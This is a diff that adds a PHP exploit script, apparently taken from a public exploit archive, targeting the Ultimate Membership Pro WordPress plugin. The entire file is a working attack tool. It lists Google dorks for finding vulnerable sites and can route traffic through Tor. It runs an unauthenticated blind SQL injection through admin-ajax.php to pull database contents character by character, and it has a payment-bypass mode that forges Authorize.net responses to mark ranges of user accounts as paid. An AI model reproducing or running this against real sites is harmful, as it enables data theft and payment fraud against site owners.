@@ -1,0 +1,173 @@
+<?php
+/**
+ * Exploit Title: Ultimate Membership Pro WordPress Plugin Exploit
+ * Google Dorks: inurl:"lid=0" OR inurl:"lid=1" ...  inurl:"lid=100" "Register" "Confirm Password"
+ * Exploit Author: wp0Day.com <contact@wp0day.com>
+ * Vendor Homepage: http://wpindeed.com/
+ * Software Link: http://codecanyon.net/item/ultimate-membership-pro-wordpress-plugin/12159253
+ * Version: 3.3
+ * Tested on: Debian 8, PHP 5.6.17-3
+ * Type: Unauthenticated Blind SQLi, Unauthenticated Payment Bypass
+ * Time line: Found [07-Jun-2016], Vendor notified [08-Jun-2016], Vendor fixed: [Yes], [RD:1466846149]
+ */
+
+
+require_once('curl.php');
+//OR
+//include('https://raw.githubusercontent.com/svyatov/CurlWrapper/master/CurlWrapper.php');
+$curl = new CurlWrapper();
+
+
+$options = getopt("t:m:l:e:s:",array('tor:'));
+print_r($options);
+$options = validateInput($options);
+
+if (!$options){
+    showHelp();
+}
+
+if ($options['tor'] === true)
+{
+    echo " ### USING TOR ###\n";
+    echo "Setting TOR Proxy...\n";
+    $curl->addOption(CURLOPT_PROXY,"http://127.0.0.1:9150/");
+    $curl->addOption(CURLOPT_PROXYTYPE,7);
+    echo "Checking IPv4 Address\n";
+    $curl->get('https://dynamicdns.park-your-domain.com/getip');
+    echo "Got IP : ".$curl->getResponse()."\n";
+    echo "Are you sure you want to do this?\nType 'wololo' to continue: ";
+    $answer = fgets(fopen ("php://stdin","r"));
+    if(trim($answer) != 'wololo'){
+        die("Aborting!\n");
+    }
+    echo "OK...\n";
+}
+
+function isTrue($sql){
+    global $curl, $options;
+    $levels = "') union all select (SELECT CASE WHEN ($sql) then 1 else 1*(select table_name from information_schema.tables) end)#";
+    $data = array(
+        'action'=>'ihc_preview_user_listing',
+        'shortcode'=>'[ihc-list-users filter_by_level="1" levels_in="'.$levels.'" theme="ihc-theme_1" ]'
+    );
+    $curl->post($options['t'].'/wp-admin/admin-ajax.php', $data);
+    $resp = $curl->getResponse();
+    return preg_match('~ihc_public_list_users_(\d+)~',$resp);
+}
+
+function exploit(){
+    global $curl, $options;
+
+    if ($options['m'] == 'pay'){
+        $level = $options['l'];
+        for($i=$options['s']; $i<$options['e']; $i++){
+            //This is mental, no IP or Hash check!
+            echo "Paying Level $level to UserID: $i\n";
+            $data = array('x_MD5_Hash'=>'1', 'x_response_code'=>'1', 'x_cust_id'=>$i, 'x_po_num'=>$level);
+            $curl->post($options['t'].'wp-content/plugins/indeed-membership-pro/authorize_response.php', $data);
+            //echo $curl->getResponse();
+        }
+    }
+    if ($options['m'] == 'sql'){
+        $query = $options['s'];
+        echo "'Running' SQL Query: $query\n";
+        echo "Getting Length";
+        $max_length = 100;
+        //Well, it is messed up, can use , (comma) in the query
+        //Binary search or divide et impera is possible with the BETWEEN operator
+        //Code it yourself :)
+        $len = 0;
+        for ($i=1;$i<$max_length;$i++){
+            $sql_len = "(select char_length( ($query) ) = $i )";
+            if (isTrue($sql_len)){
+                echo "\nLength found: $i\n";
+                $len = $i;
+                break;
+            } else {
+                echo ".";
+            }
+        }
+        if ($len !== 0 ){
+            echo "Reading char by char\nResponse:\n";
+        } else {
+            die("Failed getting length!\nAboring.\n\n");
+        }
+        $charset = 'etaoinsrhdluc@*1234567890.mfywgpbvkxqjzETAOINSRHDLUCMFYWGPBVKXQJZ';
+        for ($i=1;$i<$len;$i++){
+            $got = false;
+            for ($j=0;$j<strlen($charset);$j++){
+                $chr = $charset[$j];
+                $question = "SELECT substr(($query) FROM $i FOR 1) = '$chr' ";
+                if (isTrue($question)){
+                    echo $charset[$j];
+                    $got = true;
+                    break;
+                }
+            }
+            if (!$got){
+                echo "?";
+            }
+        }
+        echo "\n\n";
+
+    }
+}
+
+exploit();
+
+function validateInput($options){
+
+    if ( !isset($options['t']) || !filter_var($options['t'], FILTER_VALIDATE_URL) ){
+        return false;
+    }
+
+    if (!isset($options['m']) || !in_array($options['m'], array('sql', 'pay') ) ){
+        return false;
+    }
+    if ($options['m'] == 'sql' && !isset($options['s'])) {
+        return false;
+    }
+
+    if ($options['m'] == 'pay' && ( !isset($options['s']) || !isset($options['e']) || !isset($options['l']))) {
+        return false;
+    }
+    if ($options['m'] == 'pay' && ( !is_numeric($options['s']) || !is_numeric($options['e']) || !is_numeric($options['l']) )) {
+        echo "In pay mode -s -e and -l must be numeric!\n";
+        return false;
+    }
+
+    $options['tor'] = isset($options['tor']);
+
+    return $options;
+}
+
+
+function showHelp(){
+    global $argv;
+    $help = <<<EOD
+
+     Ultimate Membership Pro 8.4.1.3 WordPress Plugin Exploit
+
+
+Usage: php $argv[0] -t [TARGET URL] --tor [USE TOR?] -m [MODE] -s [QUERY] -s [START] -e [END] -l [LEVEL]
+
+       [MODE] sql  - Blind SQL Inject mode*
+              pay  - Payment bypass. Parameters -l Level ID (&lid=XX in the url), -s Start UserID, -e End UserID
+
+       *Note: You can't use , (comma) in the query.
+
+Examples:
+       php $argv[0] -t http://localhost/ --tor=yes -m sql -s 'select user()'
+       php $argv[0] -t http://localhost/ --tor=yes -m pau -s 0 -e 1000 -l 1
+
+       Marks all users with UserID between 0 and 1000 as paying customer for level ID 1
+
+    Misc:
+           CURL Wrapper by Leonid Svyatov <leonid@svyatov.ru>
+           @link http://github.com/svyatov/CurlWrapper
+           @license http://www.opensource.org/licenses/mit-license.html MIT License
+
+EOD;
+    echo $help."\n\n";
+    die();
+}
